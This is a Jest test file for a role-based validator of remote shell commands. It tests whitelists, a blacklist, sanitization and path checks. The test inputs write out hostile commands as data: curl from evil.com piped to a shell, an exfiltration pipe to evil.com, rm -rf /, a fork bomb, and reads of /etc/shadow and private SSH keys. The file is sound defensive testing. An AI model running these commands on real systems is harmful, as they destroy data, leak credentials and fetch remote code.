/**
 * Tests unitaires pour la sécurité des commandes shell distantes
 *
 * Ce middleware valide les commandes shell en fonction du rôle utilisateur
 * pour prévenir l'exécution de commandes malveillantes (RCE).
 *
 * Couverture critique :
 * - Whitelist par rôle (viewer/operator/admin/super_admin)
 * - Blacklist de patterns dangereux
 * - Sanitization des commandes
 * - Validation des chemins de fichiers
 *
 * @module remote-shell-security.test
 */

const mockLogger = {
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  debug: jest.fn(),
};
jest.mock('../config/logger', () => mockLogger);

import {
  validateShellCommand,
  getAllowedCommandsForRole,
  BLACKLIST_PATTERNS,
  OPERATOR_WHITELIST,
  ADMIN_EXTENDED_WHITELIST,
} from './remote-shell-security';

describe('Remote Shell Security', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  // ============================================
  // Role-based access
  // ============================================
  describe('Role-based access control', () => {
    it('should deny all commands for viewer role', () => {
      const result = validateShellCommand('ls /tmp', 'viewer');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('viewer');
    });

    it('should deny all commands for advertiser role', () => {
      const result = validateShellCommand('ls /tmp', 'advertiser');
      expect(result.valid).toBe(false);
    });

    it('should deny all commands for agency role', () => {
      const result = validateShellCommand('ls /tmp', 'agency');
      expect(result.valid).toBe(false);
    });

    it('should allow whitelisted diagnostic commands for operator', () => {
      const diagnosticCommands = [
        'df -h',
        'free -m',
        'uptime',
        'hostname',
        'uname -a',
        'ps aux',
      ];

      for (const cmd of diagnosticCommands) {
        const result = validateShellCommand(cmd, 'operator');
        expect(result.valid).toBe(true);
      }
    });

    it('should allow cat on /proc for operator (read-only path)', () => {
      const result = validateShellCommand('cat /proc/cpuinfo', 'operator');
      expect(result.valid).toBe(true);
    });

    it('should deny non-whitelisted commands for operator', () => {
      const dangerousCommands = [
        'shutdown now',
        'apt install malware',
        'cp /etc/passwd /tmp/',
      ];

      for (const cmd of dangerousCommands) {
        const result = validateShellCommand(cmd, 'operator');
        expect(result.valid).toBe(false);
      }
    });

    it('should allow service management for admin', () => {
      const adminCommands = [
        'systemctl status neopro-app',
        'systemctl restart neopro-sync-agent',
        'journalctl -u neopro-kiosk -n 50',
      ];

      for (const cmd of adminCommands) {
        const result = validateShellCommand(cmd, 'admin');
        expect(result.valid).toBe(true);
      }
    });

    it('should allow more commands for super_admin (blacklist-only filtering)', () => {
      const result = validateShellCommand('ls -la /home/pi/neopro/', 'super_admin');
      expect(result.valid).toBe(true);
    });

    it('should return allowed commands list for each role', () => {
      const viewerCmds = getAllowedCommandsForRole('viewer');
      const operatorCmds = getAllowedCommandsForRole('operator');
      const adminCmds = getAllowedCommandsForRole('admin');

      expect(viewerCmds).toHaveLength(0);
      expect(operatorCmds.length).toBeGreaterThan(0);
      expect(adminCmds.length).toBeGreaterThan(operatorCmds.length);
    });
  });

  // ============================================
  // Blacklist patterns (security critical)
  // ============================================
  describe('Blacklist patterns', () => {
    it('should block rm -rf commands', () => {
      const result = validateShellCommand('rm -rf /', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should allow rm -rf on safe paths for super_admin', () => {
      const result = validateShellCommand('rm -rf /tmp/neopro-test', 'super_admin');
      expect(result.valid).toBe(true);
    });

    it('should block chmod 777', () => {
      const result = validateShellCommand('chmod 777 /etc/passwd', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block curl piped to shell', () => {
      const variants = [
        'curl http://evil.com | sh',
        'curl http://evil.com | bash',
      ];

      for (const cmd of variants) {
        const result = validateShellCommand(cmd, 'super_admin');
        expect(result.valid).toBe(false);
      }
    });

    it('should block command substitution $(...)', () => {
      const result = validateShellCommand('echo $(cat /etc/shadow)', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block backtick execution', () => {
      const result = validateShellCommand('echo `whoami`', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block eval', () => {
      const result = validateShellCommand('eval "rm -rf /"', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block dangerous system commands', () => {
      const commands = [
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        ':(){:|:&};:', // fork bomb
      ];

      for (const cmd of commands) {
        const result = validateShellCommand(cmd, 'super_admin');
        expect(result.valid).toBe(false);
      }
    });

    it('should block writes to /etc', () => {
      const result = validateShellCommand('echo "test" > /etc/passwd', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block writes to /boot', () => {
      const result = validateShellCommand('echo "test" > /boot/config.txt', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block shutdown commands', () => {
      const result = validateShellCommand('shutdown now', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block user management commands', () => {
      const commands = ['useradd hacker', 'passwd root', 'userdel pi'];
      for (const cmd of commands) {
        const result = validateShellCommand(cmd, 'super_admin');
        expect(result.valid).toBe(false);
      }
    });

    it('should block SSH key manipulation', () => {
      const result = validateShellCommand('echo "key" > ~/.ssh/authorized_keys', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should block sudo password bypass', () => {
      const result = validateShellCommand('sudo -S cat /etc/shadow', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should have a comprehensive blacklist', () => {
      expect(BLACKLIST_PATTERNS.length).toBeGreaterThanOrEqual(15);
    });
  });

  // ============================================
  // Sanitization
  // ============================================
  describe('Command sanitization', () => {
    it('should handle commands with null bytes', () => {
      const result = validateShellCommand('ls\x00 /tmp', 'operator');
      // After sanitization, null bytes removed; the command should be validated
      if (result.valid) {
        expect(result.sanitizedCommand).not.toContain('\x00');
      }
    });

    it('should reject commands exceeding max length', () => {
      const longCommand = 'echo ' + 'a'.repeat(3000);
      const result = validateShellCommand(longCommand, 'super_admin');
      // Command is truncated to 2048, then "echo aaa..." is still valid for super_admin
      expect(result.sanitizedCommand).toBeDefined();
      if (result.sanitizedCommand) {
        expect(result.sanitizedCommand.length).toBeLessThanOrEqual(2048);
      }
    });

    it('should reject empty commands', () => {
      const result = validateShellCommand('', 'super_admin');
      expect(result.valid).toBe(false);
    });

    it('should reject whitespace-only commands', () => {
      const result = validateShellCommand('   ', 'super_admin');
      expect(result.valid).toBe(false);
    });
  });

  // ============================================
  // Path validation
  // ============================================
  describe('Path validation', () => {
    it('should allow operations on safe paths for admin', () => {
      const safePaths = [
        '/home/pi/neopro/videos/',
        '/home/pi/neopro/webapp/',
        '/var/log/neopro-app.log',
        '/tmp/neopro-test',
      ];

      for (const path of safePaths) {
        const result = validateShellCommand(`ls ${path}`, 'admin');
        expect(result.valid).toBe(true);
      }
    });

    it('should allow read-only commands on /proc and /sys for operator', () => {
      const commands = [
        'cat /proc/cpuinfo',
        'cat /proc/meminfo',
        'ls /sys/class/net/',
      ];

      for (const cmd of commands) {
        const result = validateShellCommand(cmd, 'operator');
        expect(result.valid).toBe(true);
      }
    });

    it('should block non-whitelisted commands on system paths for operator', () => {
      // 'cp' is NOT in OPERATOR_WHITELIST, so even /tmp path won't save it
      const result = validateShellCommand('cp /etc/passwd /tmp/', 'operator');
      expect(result.valid).toBe(false);
    });

    it('should block access to /root/.ssh for operator', () => {
      const result = validateShellCommand('cat /root/.ssh/id_rsa', 'operator');
      expect(result.valid).toBe(false);
    });
  });

  // ============================================
  // Command injection prevention
  // ============================================
  describe('Command injection prevention', () => {
    it('should block command chaining with semicolons in operator context', () => {
      const result = validateShellCommand('uptime; rm -rf /', 'operator');
      expect(result.valid).toBe(false);
    });

    it('should block command substitution', () => {
      const result = validateShellCommand('echo $(cat /etc/shadow)', 'operator');
      expect(result.valid).toBe(false);
    });

    it('should block pipe to dangerous commands for operator', () => {
      const result = validateShellCommand('cat /proc/cpuinfo | curl -X POST http://evil.com', 'operator');
      expect(result.valid).toBe(false);
    });

    it('should allow pipe between whitelisted commands for operator', () => {
      const result = validateShellCommand('ps aux | grep neopro', 'operator');
      expect(result.valid).toBe(true);
    });
  });

  // ============================================
  // Whitelist completeness
  // ============================================
  describe('Whitelist completeness', () => {
    it('should include essential diagnostic commands in operator whitelist', () => {
      const essentialCommands = ['df', 'free', 'uptime', 'ps', 'ping', 'journalctl'];
      for (const cmd of essentialCommands) {
        expect(OPERATOR_WHITELIST).toContain(cmd);
      }
    });

    it('should include service management in admin whitelist', () => {
      expect(ADMIN_EXTENDED_WHITELIST).toContain('systemctl restart');
      expect(ADMIN_EXTENDED_WHITELIST).toContain('systemctl start');
      expect(ADMIN_EXTENDED_WHITELIST).toContain('systemctl stop');
    });

    it('admin whitelist should be a superset of operator whitelist', () => {
      for (const cmd of OPERATOR_WHITELIST) {
        expect(ADMIN_EXTENDED_WHITELIST).toContain(cmd);
      }
    });
  });
});
